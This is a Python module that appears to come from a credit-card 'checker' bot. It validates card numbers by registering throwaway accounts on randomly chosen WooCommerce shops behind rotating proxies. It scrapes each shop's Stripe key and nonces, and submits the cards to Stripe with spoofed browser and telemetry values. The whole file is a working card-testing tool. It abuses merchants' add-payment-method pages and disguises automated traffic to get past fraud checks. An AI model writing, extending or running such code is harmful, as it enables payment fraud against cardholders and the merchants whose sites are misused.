# utils/stripe_check_sync.py
"""Synchronous Stripe card checker with retry logic.
This implementation mirrors the legacy JavaScript flow, using `requests`
instead of async aiohttp. It is useful for contexts where async code
cannot be used.
"""

import random
import string
import json
import re
import time
from urllib.parse import quote_plus
import requests
from bot_info import PROXIES, STRIPE_DOMAINS

from .response_classifier import classify_stripe_response

def check_stripe_card(cc_data: str):
    """Check a credit‑card using Stripe via a temporary WooCommerce account.
    Returns a tuple ``(status, message, extra_info)``.
    """
    max_retries = 3
    retry_delay = 2  # seconds between attempts

    for attempt in range(max_retries):
        try:
            session = requests.Session()
            # Apply proxy configuration
            if isinstance(PROXIES, list) and PROXIES:
                proxy = random.choice(PROXIES)
                session.proxies.update({"http": proxy, "https": proxy})
            elif isinstance(PROXIES, dict):
                session.proxies.update(PROXIES)
            elif isinstance(PROXIES, str) and PROXIES:
                session.proxies.update({"http": PROXIES, "https": PROXIES})
            session.headers.update({
                "user-agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
                )
            })

            if not STRIPE_DOMAINS:
                return "Error", "No STRIPE_DOMAINS configured in bot_info", ""
            domain = random.choice(STRIPE_DOMAINS)

            # Parse card data
            parts = cc_data.split("|")
            if len(parts) != 4:
                return "Error", "Formato inválido", {}
            cc, mes, ano, cvv = [p.strip() for p in parts] # ano should be 4 digits here
            cc = cc.replace(" ", "") # Remove spaces from CC number

            # 1️⃣ Register a temporary account
            r = session.get(f"https://{domain}/my-account/", timeout=10)
            r.raise_for_status()
            register_nonce_match = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', r.text)
            if not register_nonce_match:
                register_nonce_match = re.search(r'value="([^"]+)"[^>]*name="woocommerce-register-nonce"', r.text)
            if not register_nonce_match:
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                    continue
                return "Error", "No se pudo encontrar el nonce de registro", ""
            register_nonce = register_nonce_match.group(1)

            username = "user" + "".join(random.choices(string.digits, k=6))
            email = f"test{username}@test.com"
            password = "TestPassword123!"
            register_data = {
                "username": username,
                "email": email,
                "password": password,
                "woocommerce-register-nonce": register_nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }
            r = session.post(
                f"https://{domain}/my-account/",
                data=register_data,
                headers={"referer": f"https://{domain}/my-account/"},
                timeout=10,
            )
            r.raise_for_status()
            if "my-account" not in r.url or "logout" not in r.text.lower():
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                    continue
                return "Error", "Registro de cuenta fallido", ""

            # 2️⃣ Load the add‑payment page
            r = session.get(
                f"https://{domain}/my-account/add-payment-method/",
                headers={"referer": f"https://{domain}/my-account/"},
                timeout=10,
            )
            r.raise_for_status()

            # 3️⃣ Extract Stripe parameters from the page
            stripe_match = re.search(r'var wc_stripe_upe_params = ({{.*?}});', r.text)
            if not stripe_match:
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                    continue
                return "Error", "No se pudieron extraer parámetros Stripe", ""
            stripe_params = json.loads(stripe_match.group(1))

            # 4️⃣ Create a payment method via Stripe's public endpoint
            stripe_data = (
                f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={ano}&card[exp_month]={mes}'
                '&allow_redisplay=unspecified&billing_details[address][postal_code]=90210&billing_details[address][country]=US' # Use a valid postal code
                '&pasted_fields=number&payment_user_agent=stripe.js%2Fc1fbe29896%3B+stripe-js-v3%2Fc1fbe29896%3B+payment-element%3B+deferred-intent'
                f'&referrer=https%3A%2F%2F{domain}&time_on_page=26572'
                '&guid=de6b68f4-b627-45ec-ac81-0008278741551c128f&muid=2a7d74b6-4638-4e76-b1cd-5b9e904205171851d7'
                '&sid=69512276-4e32-48eb-9348-32137bb630f4aaaad1'
                f'&key={quote_plus(stripe_params["key"])}&_stripe_version=2024-06-20'
            )
            r = session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_data,
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": f"https://{domain}",
                    "referer": f"https://{domain}/my-account/add-payment-method/",
                },
                timeout=10,
            )
            r.raise_for_status()
            payment_method_data = r.json()
            if "error" in payment_method_data:
                # Dejar que el clasificador maneje el error de la API de Stripe
                status, message = classify_stripe_response(payment_method_data)
                return status, message, payment_method_data

            # 5️⃣ Confirm the SetupIntent via the site AJAX endpoint
            r = session.post(
                f"https://{domain}/wp-admin/admin-ajax.php",
                data={
                    "action": "wc_stripe_create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": payment_method_data["id"],
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": stripe_params["createAndConfirmSetupIntentNonce"],
                },
                headers={"x-requested-with": "XMLHttpRequest"},
                timeout=10,
            )
            r.raise_for_status()
            final_resp = r.json()
            # El clasificador puede manejar tanto respuestas de éxito como de error del AJAX
            status, message = classify_stripe_response(final_resp)
            return status, message, final_resp
        except requests.RequestException as e:
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
                continue
            return "Error", f"Connection error: {str(e)}", ""
        except (AttributeError, json.JSONDecodeError, TypeError) as e:
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
                continue
            return "Error", f"Parsing error: {str(e)}", ""
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
                continue
            return "Error", f"Unexpected error: {str(e)}", ""
    return "Error", f"Max retries ({max_retries}) exceeded", ""

__all__ = ["check_stripe_card"]
